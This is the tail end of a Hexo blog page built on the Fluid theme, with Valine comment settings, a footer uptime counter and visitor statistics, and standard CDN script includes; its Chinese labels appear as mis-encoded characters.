          {"appId":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","appKey":"p527aBaA4G01EJdMOVMGXsHR","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://0wmntqqc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner" style="text-align:center; color:#555; margin-top:20px;">

  <!-- è®¡æ—¶å™¨ -->
  <div style="margin-bottom:10px; font-size:14px; color:#ff6f61;">
    ğŸš€ å·²è¿è¡Œï¼š
    <span id="timeDate">è½½å…¥å¤©æ•°...</span>
    <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span>
    <script>
      function createtime() {
          var now = new Date();
          var grt = new Date("08/07/2025 00:00:00");
          var diff = now - grt;

          var days = Math.floor(diff / 1000 / 60 / 60 / 24);
          var hours = Math.floor((diff / 1000 / 60 / 60) % 24);
          var minutes = Math.floor((diff / 1000 / 60) % 60);
          var seconds = Math.floor((diff / 1000) % 60);

          if(hours<10) hours="0"+hours;
          if(minutes<10) minutes="0"+minutes;
          if(seconds<10) seconds="0"+seconds;

          document.getElementById("timeDate").innerHTML = days + " å¤©";
          document.getElementById("times").innerHTML = hours + " æ—¶ " + minutes + " åˆ† " + seconds + " ç§’";
      }
      setInterval(createtime, 1000);
      createtime();
    </script>
  </div>

  <!-- è‡ªå®šä¹‰å†…å®¹ -->
  
    <div style="margin-bottom:10px; font-size:13px; color:#666;">
      â¤ï¸  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  


  <!-- PV/UV ç»Ÿè®¡ï¼ˆBusuanziï¼‰ -->
  
    <div style="margin-bottom:12px; font-size:14px; color:#3b82f6;">
      ğŸ‘â€ğŸ—¨ æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_page_pv">è½½å…¥ä¸­...</span>  
      ğŸ§‘ æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv">è½½å…¥ä¸­...</span>
    </div>
    <script src="https://cdn.tutorialjinni.com/busuanzi/2.3.0/bsz.pure.mini.js"></script>
  


</div>

<script src="/js/summon-plane.js"></script>



  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="/xm_custom/custom.js"></script>



<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
